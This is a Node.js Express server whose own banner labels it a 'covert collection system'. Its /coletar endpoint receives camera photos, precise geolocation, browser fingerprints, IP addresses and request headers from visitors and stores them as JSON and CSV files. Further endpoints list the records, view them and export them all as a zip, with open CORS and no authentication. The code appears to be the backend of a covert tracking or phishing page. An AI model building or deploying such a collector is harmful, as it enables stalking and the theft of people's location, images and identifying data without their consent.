const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const fs = require('fs-extra');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const archiver = require('archiver');

const app = express();
const PORT = process.env.PORT || 3000;
const UPLOAD_DIR = path.join(__dirname, 'uploads');
const LOG_FILE = path.join(UPLOAD_DIR, 'coletas.log');

app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: '*', methods: ['POST', 'GET'] }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

fs.ensureDirSync(UPLOAD_DIR);
fs.ensureFileSync(LOG_FILE);

function logToFile(message, data = null) {
    const timestamp = new Date().toISOString();
    const logEntry = { timestamp, message, data: data || null };
    fs.appendFileSync(LOG_FILE, JSON.stringify(logEntry) + '\n');
    console.log(`[${timestamp}] ${message}`);
}

app.post('/coletar', async (req, res) => {
    try {
        const dados = req.body;
        const id = uuidv4();
        const timestamp = Date.now();
        const dataHora = new Date().toISOString();
        
        logToFile(`📥 Nova coleta - ID: ${id}`);

        let fotoSalva = false;
        let nomeFoto = null;
        
        if (dados.foto && dados.foto.startsWith('data:image')) {
            try {
                const base64Data = dados.foto.replace(/^data:image\/\w+;base64,/, '');
                const extensao = dados.foto.match(/^data:image\/(\w+);base64,/)?.[1] || 'jpg';
                nomeFoto = `foto_${id}_${timestamp}.${extensao}`;
                fs.writeFileSync(path.join(UPLOAD_DIR, nomeFoto), base64Data, 'base64');
                fotoSalva = true;
                logToFile(`📸 Foto: ${nomeFoto}`);
            } catch (err) {
                logToFile(`❌ Erro foto: ${err.message}`);
            }
        }

        const dadosParaSalvar = {
            id,
            timestamp: dataHora,
            localizacao: dados.localizacao || null,
            navegador: dados.navegador || null,
            ip: req.ip || req.connection.remoteAddress,
            headers: req.headers,
            foto: fotoSalva ? nomeFoto : null
        };

        fs.writeFileSync(
            path.join(UPLOAD_DIR, `dados_${id}_${timestamp}.json`),
            JSON.stringify(dadosParaSalvar, null, 2)
        );

        const csvPath = path.join(UPLOAD_DIR, 'todos_dados.csv');
        const csvExiste = fs.existsSync(csvPath);
        const csvLine = [
            dataHora, id,
            dados.localizacao?.latitude || 'N/A',
            dados.localizacao?.longitude || 'N/A',
            dados.localizacao?.precisao || 'N/A',
            dados.navegador?.userAgent || 'N/A',
            dados.navegador?.timezone || 'N/A',
            dados.navegador?.language || 'N/A',
            req.ip || 'N/A',
            fotoSalva ? 'Sim' : 'Não'
        ].join(',');

        if (!csvExiste) {
            fs.writeFileSync(csvPath, 'Data,ID,Latitude,Longitude,Precisao,UserAgent,Timezone,Idioma,IP,Foto\n' + csvLine + '\n');
        } else {
            fs.appendFileSync(csvPath, csvLine + '\n');
        }

        res.json({ status: 'success', id, fotoSalva, timestamp: dataHora });

    } catch (error) {
        logToFile(`❌ ERRO: ${error.message}`);
        res.status(500).json({ status: 'error', mensagem: 'Erro interno' });
    }
});

app.get('/listar', (req, res) => {
    const arquivos = fs.readdirSync(UPLOAD_DIR)
        .filter(f => f.endsWith('.json') && f.startsWith('dados_'))
        .map(f => {
            const stats = fs.statSync(path.join(UPLOAD_DIR, f));
            return { arquivo: f, tamanho: stats.size, data: stats.mtime };
        })
        .sort((a, b) => b.data - a.data);
    
    res.json({ total: arquivos.length, arquivos: arquivos.slice(0, 50) });
});

app.get('/visualizar/:id', (req, res) => {
    const id = req.params.id;
    const arquivos = fs.readdirSync(UPLOAD_DIR);
    const arquivo = arquivos.find(f => f.includes(id) && f.endsWith('.json'));
    if (!arquivo) return res.status(404).json({ erro: 'Não encontrado' });
    res.json(fs.readJsonSync(path.join(UPLOAD_DIR, arquivo)));
});

app.get('/exportar', async (req, res) => {
    try {
        const zipPath = path.join(UPLOAD_DIR, `export_${Date.now()}.zip`);
        const output = fs.createWriteStream(zipPath);
        const archive = archiver('zip', { zlib: { level: 9 } });
        archive.pipe(output);
        archive.directory(UPLOAD_DIR, false);
        await archive.finalize();
        output.on('close', () => {
            res.download(zipPath, 'dados_coletados.zip', () => fs.unlinkSync(zipPath));
        });
    } catch (err) {
        res.status(500).json({ erro: 'Erro ao exportar' });
    }
});

app.listen(PORT, () => {
    console.log(`
    ════════════════════════════════════════════
    🕵️  SISTEMA DE COLETA FURTIVA
    ════════════════════════════════════════════
    📡 Servidor: http://localhost:${PORT}
    📁 Dados: ${UPLOAD_DIR}
    ════════════════════════════════════════════
    `);
});
